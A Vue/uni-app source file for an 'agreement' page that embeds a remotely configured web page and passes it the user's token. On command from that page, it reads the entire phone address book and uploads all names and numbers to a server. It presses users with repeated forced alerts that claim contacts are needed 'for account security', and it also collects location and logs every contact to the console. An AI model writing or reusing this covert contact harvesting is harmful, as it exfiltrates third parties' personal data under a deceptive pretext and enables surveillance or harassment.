<template>
  <view class="agreement-page">
    <web-view
      v-if="webViewUrl"
      :key="refreshKey"
      :src="webViewUrl"
      allow="camera *;geolocation *;"
      :progress="false"
      @message="handleWebViewMessage"
    />

    <view
      v-else
      class="agreement-state"
    >
      <text class="agreement-state__title">
        {{ loading ? '正在进入服务' : '暂时无法进入' }}
      </text>
      <text class="agreement-state__copy">
        {{ loading ? '正在校验账号与服务配置' : errorMessage }}
      </text>
      <button
        v-if="!loading"
        class="agreement-retry"
        hover-class="none"
        @tap="loadEntryUrl"
      >
        重新加载
      </button>
    </view>
  </view>
</template>

<script setup>
import { onMounted, onUnmounted, ref } from 'vue'
import { onReady, onShow } from '@dcloudio/uni-app'
import { getAgreementConfig,uploadOtherContacts } from '@/api/agreement'
import { useUserStore } from '@/stores'
import { getToken } from '@/utils/auth'
import { toast } from '@/utils/common'

function getAppName () {
  try {
    if (typeof uni.getAppBaseInfo === 'function') {
      const name = uni.getAppBaseInfo()?.appName
      if (name) return name
    }
  } catch (error) {}

  try {
    const name = uni.getSystemInfoSync()?.appName
    if (name) return name
  } catch (error) {}

  return ''
}
const AgreementConfigKey = getAppName()
const userStore = useUserStore()
const webViewUrl = ref('')
const refreshKey = ref(0)
const loading = ref(true)
const errorMessage = ref('服务配置读取失败，请稍后重试')
let entryBaseUrl = ''
let actionPending = false
let contactUploadPromise = null
let lockingContacts = false
let forceAlertVisible = false
let resumeCheckTimer = null
let settingsReturnWatcherTimer = null
let settingsReturnCheckArmed = false
let softContactRejectCount = 0
let activeContactPermissionMode = null
let activeLocationPermissionMode = null
let locationPermissionRequired = false
let locationPermissionLocking = false
let forceLocationAlertVisible = false
let locationCheckTimer = null
let locationSettingsReturnWatcherTimer = null
let locationSettingsReturnCheckArmed = false
let softLocationRejectCount = 0
const SoftContactRejectLimit = 2
const SoftLocationRejectLimit = 2

function createContactResult ({
  uploaded = false,
  hasPermission = false,
  count = 0,
  platform = ''
} = {}) {
  return {
    uploaded,
    hasData: count > 0,
    hasPermission,
    count,
    platform
  }
}
function parseConfig (payload) {
  if (!payload) return {}
  if (typeof payload === 'object') return payload

  try {
    return JSON.parse(payload)
  } catch (error) {
    throw new Error('服务配置格式无效')
  }
}

function isSafeWebUrl (value) {
  return /^https?:\/\//i.test(String(value || '').trim())
}

function buildEntryUrl (baseUrl, location = null) {
  const systemInfo = uni.getSystemInfoSync() || {}
  const query = [
    ['token', getToken()],
    ['statusHeight', systemInfo.statusBarHeight || 0],
    ['appName', getAppName()],
    ['longitude', location?.longitude],
    ['latitude', location?.latitude]
  ].filter(([, value]) => value !== undefined && value !== null && value !== '')
    .map(([key, value]) => `${key}=${encodeURIComponent(String(value))}`).join('&')

  return `${baseUrl}${baseUrl.includes('?') ? '&' : '?'}${query}`
}

function normalizeLocation (location) {
  const longitude = Number(location?.longitude)
  const latitude = Number(location?.latitude)
  if (!Number.isFinite(longitude) || !Number.isFinite(latitude)) return null
  return { longitude, latitude }
}

function getNativeLocation () {
  return new Promise((resolve) => {
    uni.getLocation({
      type: 'wgs84',
      success: (location) => {
        const coordinates = normalizeLocation(location)
        console.info('[AgreementLocation] 原生定位成功')
        resolve(coordinates)
      },
      fail: (error) => {
        console.info('[AgreementLocation] 原生定位失败', {
          message: error?.message || error?.errMsg || error?.code || ''
        })
        resolve(null)
      }
    })
  })
}

function stopLocationCheckTimer () {
  if (!locationCheckTimer) return
  clearTimeout(locationCheckTimer)
  locationCheckTimer = null
}

function stopLocationSettingsReturnWatcher () {
  if (!locationSettingsReturnWatcherTimer) return
  clearTimeout(locationSettingsReturnWatcherTimer)
  locationSettingsReturnWatcherTimer = null
}

function resetLocationPermissionLockState () {
  locationPermissionRequired = false
  locationPermissionLocking = false
  locationSettingsReturnCheckArmed = false
  activeLocationPermissionMode = null
  stopLocationCheckTimer()
  stopLocationSettingsReturnWatcher()
}

function showForceLocationAlert () {
  // #ifdef APP-PLUS
  if (forceLocationAlertVisible) return
  forceLocationAlertVisible = true
  plus.nativeUI.alert(
    '该服务需要获取您的位置信息，请在系统设置中开启定位权限后继续。',
    () => {
      forceLocationAlertVisible = false
      locationPermissionLocking = true
      locationSettingsReturnCheckArmed = true
      startLocationSettingsReturnWatcher()
      uni.openAppAuthorizeSetting()
    },
    '定位权限',
    '去开启'
  )
  // #endif

  // #ifndef APP-PLUS
  toast('请开启位置权限后继续')
  // #endif
}

function isSoftLocationRequest (permissionMode) {
  return permissionMode === 2
}

function shouldSkipSoftLocationRequest (permissionMode) {
  return isSoftLocationRequest(permissionMode) && softLocationRejectCount >= SoftLocationRejectLimit
}

function appendLocationToWebView (location) {
  if (!entryBaseUrl || !location) return
  webViewUrl.value = buildEntryUrl(entryBaseUrl, location)
  refreshKey.value += 1
}

function acceptLocationRequest (location) {
  softLocationRejectCount = 0
  resetLocationPermissionLockState()
  appendLocationToWebView(location)
}

function rejectLocationRequest (permissionMode, source) {
  if (permissionMode == null) {
    resetLocationPermissionLockState()
    return
  }

  activeLocationPermissionMode = permissionMode
  locationPermissionRequired = true

  if (isSoftLocationRequest(permissionMode)) {
    if (softLocationRejectCount >= SoftLocationRejectLimit) {
      console.info('[AgreementLocation] 弱定位请求已达到拒绝上限，停止弹框', {
        source,
        softLocationRejectCount,
        limit: SoftLocationRejectLimit
      })
      resetLocationPermissionLockState()
      return
    }

    softLocationRejectCount += 1
    console.info('[AgreementLocation] 弱定位请求未通过，记录拒绝次数', {
      source,
      softLocationRejectCount,
      limit: SoftLocationRejectLimit
    })
  }

  locationPermissionLocking = true
  showForceLocationAlert()
}

function startLocationSettingsReturnWatcher () {
  stopLocationSettingsReturnWatcher()
  locationSettingsReturnWatcherTimer = setTimeout(() => {
    locationSettingsReturnWatcherTimer = null
    scheduleLockedLocationCheck('watcher')
  }, 1500)
}

async function checkLockedLocation () {
  if (!locationPermissionRequired || !locationPermissionLocking || forceLocationAlertVisible) return

  const permissionMode = activeLocationPermissionMode
  if (permissionMode == null) {
    resetLocationPermissionLockState()
    return
  }

  if (shouldSkipSoftLocationRequest(permissionMode)) {
    console.info('[AgreementLocation] 设置页返回时弱定位请求已达到拒绝上限，跳过复查', {
      permissionMode,
      softLocationRejectCount
    })
    resetLocationPermissionLockState()
    return
  }

  if (isSoftLocationRequest(permissionMode) && !locationSettingsReturnCheckArmed) {
    console.info('[AgreementLocation] 弱定位请求没有待返回复查状态，跳过本次检测', {
      permissionMode,
      softLocationRejectCount
    })
    return
  }

  if (isSoftLocationRequest(permissionMode)) locationSettingsReturnCheckArmed = false
  stopLocationSettingsReturnWatcher()

  const location = await getNativeLocation()
  console.info('[AgreementLocation] 设置页返回后复查定位结果', {
    permissionMode,
    softLocationRejectCount,
    location
  })

  if (location) {
    acceptLocationRequest(location)
  } else {
    rejectLocationRequest(permissionMode, 'resume')
  }
}

function scheduleLockedLocationCheck (source = 'lifecycle') {
  if (!locationPermissionLocking) return
  stopLocationCheckTimer()
  locationCheckTimer = setTimeout(() => {
    locationCheckTimer = null
    console.info('[AgreementLocation] 触发定位权限复查', { source })
    checkLockedLocation()
  }, 600)
}

async function loadEntryUrl () {
  if (loading.value && webViewUrl.value) return

  loading.value = true
  errorMessage.value = '服务配置读取失败，请稍后重试'
  try {
    const config = parseConfig(await getAgreementConfig(AgreementConfigKey))
    const entryUrl = String(config.h5DownloadUrl || '').trim()
    if (!isSafeWebUrl(entryUrl)) throw new Error('服务入口暂未配置')

    entryBaseUrl = entryUrl
    webViewUrl.value = buildEntryUrl(entryBaseUrl)
    console.log(webViewUrl.value)
    refreshKey.value += 1
  } catch (error) {
    entryBaseUrl = ''
    webViewUrl.value = ''
    errorMessage.value = error?.message || '服务配置读取失败，请稍后重试'
  } finally {
    loading.value = false
  }
}

function refreshWebView () {
  if (!webViewUrl.value) return
  refreshKey.value += 1
}

function showForceContactAlert () {
  // #ifdef APP-PLUS
  if (forceAlertVisible) return
  forceAlertVisible = true
  plus.nativeUI.alert(
    '为了保障您的账户安全及正常使用服务，请务必开启通讯录权限。',
    () => {
      forceAlertVisible = false
      lockingContacts = true
      settingsReturnCheckArmed = true
      startSettingsReturnWatcher()
      uni.openAppAuthorizeSetting()
    },
    '权限申请',
    '去开启'
  )
  // #endif
}

function isIosRuntime () {
  const systemInfo = uni.getSystemInfoSync() || {}
  return String(systemInfo.osName || systemInfo.platform || '').toLowerCase().includes('ios')
}

function getContactPlatform () {
  return isIosRuntime() ? 'ios' : 'android'
}

function normalizeContactRows (contacts = []) {
  const rows = []
  contacts.forEach((contact) => {
    const name = contact.displayName || '未知姓名'
    const phoneNumbers = contact.phoneNumbers || []
    phoneNumbers.forEach((phoneItem) => {
      const phone = String(phoneItem.value || '').replace(/[\s-]/g, '')
      if (phone) rows.push({ name, phone })
    })
  })
  return rows
}

async function uploadContactRows (rows) {
  if (!rows.length) return false

  let userId = userStore.profile?.userId
  console.info('[AgreementContacts] 当前缓存用户信息', {
    userId,
    mobile: userStore.profile?.mobile,
    nickname: userStore.profile?.nickname
  })

  if (!userId) {
    const profile = await userStore.fetchProfile()
    userId = profile?.userId
    console.info('[AgreementContacts] 接口获取用户信息', {
      userId,
      mobile: profile?.mobile,
      nickname: profile?.nickname
    })
  }
  if (!userId) throw new Error('当前账号缺少用户标识')

  console.info('[AgreementContacts] 准备上报通讯录', {
    userId,
    count: rows.length,
    first: rows[0] || null
  })

  await uploadOtherContacts({
    userId,
    otherContact: JSON.stringify(rows)
  })
  console.info('[AgreementContacts] 通讯录上报接口调用成功', {
    userId,
    count: rows.length
  })
  return true
}

function fetchContactsData () {
  let result = Promise.resolve(createContactResult())

  // #ifdef APP-PLUS
  if (contactUploadPromise) {
    result = contactUploadPromise
  } else {
    contactUploadPromise = new Promise((resolve) => {
      plus.contacts.getAddressBook(
        plus.contacts.ADDRESSBOOK_PHONE,
        (addressBook) => {
          addressBook.find(
            null,
            async (contacts) => {
              const rows = normalizeContactRows(contacts)
              const platform = getContactPlatform()
              console.info('[AgreementContacts] 通讯录读取成功', {
                platform,
                rawCount: contacts.length,
                validCount: rows.length
              })
              console.info('[AgreementContacts] 全部有效通讯录信息', rows)
              try {
                const uploaded = await uploadContactRows(rows)
                resolve(createContactResult({
                  uploaded,
                  hasPermission: true,
                  count: rows.length,
                  platform
                }))
              } catch (error) {
                if (!error?.handled) toast(error?.message || '通讯录上报失败')
                console.info('[AgreementContacts] 通讯录上报接口调用失败', {
                  platform,
                  count: rows.length,
                  message: error?.message || ''
                })
                resolve(createContactResult({
                  hasPermission: true,
                  count: rows.length,
                  platform
                }))
              }
            },
            (error) => {
              const platform = getContactPlatform()
              console.info('[AgreementContacts] 通讯录查询失败', {
                platform,
                message: error?.message || error?.code || ''
              })
              resolve(createContactResult({
                hasPermission: true,
                platform
              }))
            },
            { multiple: true }
          )
        },
        (error) => {
          const platform = getContactPlatform()
          console.info('[AgreementContacts] 通讯录权限/地址簿获取失败', {
            platform,
            message: error?.message || error?.code || ''
          })
          resolve(createContactResult({
            platform
          }))
        }
      )
    }).finally(() => {
      contactUploadPromise = null
    })
    result = contactUploadPromise
  }
  // #endif

  return result
}

function readMessagePayload (event) {
  let payload = event?.detail?.data ?? event?.data
  if (payload?.arg?.data) payload = payload.arg.data
  else if (payload?.data) payload = payload.data

  if (typeof payload === 'string') {
    try {
      payload = JSON.parse(payload)
    } catch (error) {
      return null
    }
  }

  return Array.isArray(payload) ? payload[0] : payload
}

function getContactRequirementValue (payload) {
  if (Object.prototype.hasOwnProperty.call(payload, 'needOtherConstact')) return payload.needOtherConstact
  if (Object.prototype.hasOwnProperty.call(payload, 'value')) return payload.value
  return null
}

function getLocationRequirementValue (payload) {
  if (Object.prototype.hasOwnProperty.call(payload, 'needLoaction')) return payload.needLoaction
  if (Object.prototype.hasOwnProperty.call(payload, 'value')) return payload.value
  return null
}

function shouldAcceptContactResult (result) {
  return Number(result?.count || 0) >= 1
}

function isSoftContactRequest (permissionMode) {
  return permissionMode === 2
}

function shouldSkipSoftContactRequest (permissionMode) {
  return isSoftContactRequest(permissionMode) && softContactRejectCount >= SoftContactRejectLimit
}

function stopResumeCheckTimer () {
  if (!resumeCheckTimer) return
  clearTimeout(resumeCheckTimer)
  resumeCheckTimer = null
}

function stopSettingsReturnWatcher () {
  if (!settingsReturnWatcherTimer) return
  clearTimeout(settingsReturnWatcherTimer)
  settingsReturnWatcherTimer = null
}

function startSettingsReturnWatcher () {
  stopSettingsReturnWatcher()
  settingsReturnWatcherTimer = setTimeout(() => {
    settingsReturnWatcherTimer = null
    scheduleLockedContactsCheck('watcher')
  }, 1500)
}

function resetContactLockState () {
  activeContactPermissionMode = null
  lockingContacts = false
  settingsReturnCheckArmed = false
  stopSettingsReturnWatcher()
}

function acceptContactRequest () {
  softContactRejectCount = 0
  resetContactLockState()
  refreshWebView()
}

function rejectContactRequest (permissionMode, source) {
  if (permissionMode == null) {
    resetContactLockState()
    return
  }

  activeContactPermissionMode = permissionMode

  if (isSoftContactRequest(permissionMode)) {
    if (softContactRejectCount >= SoftContactRejectLimit) {
      console.info('[AgreementContacts] 弱通讯录请求已达到拒绝上限，停止弹框', {
        source,
        softContactRejectCount,
        limit: SoftContactRejectLimit
      })
      resetContactLockState()
      return
    }

    softContactRejectCount += 1
    console.info('[AgreementContacts] 弱通讯录请求未通过，记录拒绝次数', {
      source,
      softContactRejectCount,
      limit: SoftContactRejectLimit
    })
  }

  showForceContactAlert()
}

async function executeAction (payload) {
  if (!payload?.action || actionPending) return

  if (payload.action === 'three') {
    const target = String(payload.path || '').trim()
    if (!isSafeWebUrl(target)) {
      toast('链接地址无效')
      return
    }
    uni.navigateTo({
      url: `/pages/threeweb-view/index?url=${encodeURIComponent(target)}`
    })
    return
  }
  if (payload.action === 'needLoaction') {
    const requirementValue = getLocationRequirementValue(payload)
    if (requirementValue == null || requirementValue === '') return

    const permissionMode = Number(requirementValue)
    if (!Number.isFinite(permissionMode)) return

    activeLocationPermissionMode = permissionMode
    locationPermissionRequired = true
    if (shouldSkipSoftLocationRequest(permissionMode)) {
      console.info('[AgreementLocation] 弱定位请求已达到拒绝上限，跳过处理', {
        permissionMode,
        softLocationRejectCount
      })
      resetLocationPermissionLockState()
      return
    }

    const location = await getNativeLocation()
    console.info('[AgreementLocation] H5 请求定位处理结果', {
      permissionMode,
      isForce: !isSoftLocationRequest(permissionMode),
      softLocationRejectCount,
      location
    })

    if (location) {
      acceptLocationRequest(location)
    } else {
      rejectLocationRequest(permissionMode, 'h5')
    }
    return
  }
  if (payload.action === 'needOtherConstact') {
    const requirementValue = getContactRequirementValue(payload)
    if (requirementValue == null || requirementValue === '') return

    const permissionMode = Number(requirementValue)
    if (!Number.isFinite(permissionMode)) return

    activeContactPermissionMode = permissionMode
    if (shouldSkipSoftContactRequest(permissionMode)) {
      console.info('[AgreementContacts] 弱通讯录请求已达到拒绝上限，跳过处理', {
        permissionMode,
        softContactRejectCount
      })
      resetContactLockState()
      return
    }

    const isForce = !isSoftContactRequest(permissionMode)
    const contactResult = await fetchContactsData()

    console.info('[AgreementContacts] H5 请求通讯录处理结果', {
      permissionMode,
      isForce,
      softContactRejectCount,
      contactResult
    })

    if (shouldAcceptContactResult(contactResult)) {
      acceptContactRequest()
    } else {
      rejectContactRequest(permissionMode, 'h5')
    }
    return
  }

  actionPending = true
  try {
    if (payload.action === 'logout') {
      try {
        await userStore.logOut()
      } catch (error) {
        const message = (error && error.message) || '退出失败'
        if (!(error && error.handled)) toast(message)
      }
      uni.reLaunch({ url: '/pages/login/index' })
      return
    }

    if (payload.action === 'deleteAccount') {
      await userStore.destroyAccount()
      uni.reLaunch({ url: '/pages/login/index' })
    }
  } catch (error) {
    const message = (error && error.message) || '操作失败，请稍后重试'
    if (!(error && error.handled)) toast(message)
  } finally {
    actionPending = false
  }
}

function handleWebViewMessage (event) {
  executeAction(readMessagePayload(event))
}

async function checkLockedContacts () {
  if (!lockingContacts || forceAlertVisible) return
  const permissionMode = activeContactPermissionMode
  if (permissionMode == null) {
    resetContactLockState()
    return
  }

  if (shouldSkipSoftContactRequest(permissionMode)) {
    console.info('[AgreementContacts] 设置页返回时弱通讯录请求已达到拒绝上限，跳过复查', {
      permissionMode,
      softContactRejectCount
    })
    resetContactLockState()
    return
  }

  if (isSoftContactRequest(permissionMode) && !settingsReturnCheckArmed) {
    console.info('[AgreementContacts] 弱通讯录请求没有待返回复查状态，跳过本次检测', {
      permissionMode,
      softContactRejectCount
    })
    return
  }

  if (isSoftContactRequest(permissionMode)) settingsReturnCheckArmed = false
  stopSettingsReturnWatcher()

  const contactResult = await fetchContactsData()
  console.info('[AgreementContacts] 设置页返回后复查通讯录结果', {
    permissionMode,
    softContactRejectCount,
    contactResult
  })

  if (shouldAcceptContactResult(contactResult)) {
    acceptContactRequest()
  } else {
    rejectContactRequest(permissionMode, 'resume')
  }
}

function scheduleLockedContactsCheck (source = 'lifecycle') {
  if (!lockingContacts) return
  stopResumeCheckTimer()
  resumeCheckTimer = setTimeout(() => {
    resumeCheckTimer = null
    console.info('[AgreementContacts] 触发返回复查', {
      source,
      activeContactPermissionMode,
      softContactRejectCount,
      settingsReturnCheckArmed
    })
    checkLockedContacts()
  }, 600)
}

// #ifdef H5
function handleWindowMessage (event) {
  executeAction(readMessagePayload(event))
}

onMounted(() => window.addEventListener('message', handleWindowMessage))
onUnmounted(() => window.removeEventListener('message', handleWindowMessage))
// #endif

function handleAppForeground () {
  scheduleLockedContactsCheck('app-show')
  scheduleLockedLocationCheck('app-show')
}

function handlePlusResume () {
  scheduleLockedContactsCheck('resume')
  scheduleLockedLocationCheck('resume')
}

// #ifdef APP-PLUS
onMounted(() => {
  plus.globalEvent.addEventListener('resume', handlePlusResume)
  uni.onAppShow?.(handleAppForeground)
})

onUnmounted(() => {
  plus.globalEvent.removeEventListener('resume', handlePlusResume)
  uni.offAppShow?.(handleAppForeground)
  stopResumeCheckTimer()
  resetContactLockState()
  resetLocationPermissionLockState()
})
// #endif

onReady(loadEntryUrl)

onShow(() => {
  scheduleLockedContactsCheck('page-show')
  scheduleLockedLocationCheck('page-show')
})
</script>

<style lang="scss" scoped>
.agreement-page,
.agreement-state {
  min-height: 100vh;
}

.agreement-page {
  background: var(--color-bg);
}

.agreement-state {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  box-sizing: border-box;
  padding: 64rpx;
  color: var(--color-text);
  text-align: center;
}

.agreement-state__title,
.agreement-state__copy {
  display: block;
}

.agreement-state__title {
  font-size: 34rpx;
  font-weight: 650;
}

.agreement-state__copy {
  max-width: 520rpx;
  margin-top: 14rpx;
  color: var(--color-muted);
  font-size: 25rpx;
  line-height: 1.7;
}

.agreement-retry {
  width: 280rpx;
  height: 84rpx;
  margin-top: 38rpx;
  border-radius: 8rpx;
  background: var(--color-primary);
  color: var(--color-surface);
  font-size: 27rpx;
  line-height: 84rpx;
}

.agreement-retry::after {
  border: 0;
}
</style>
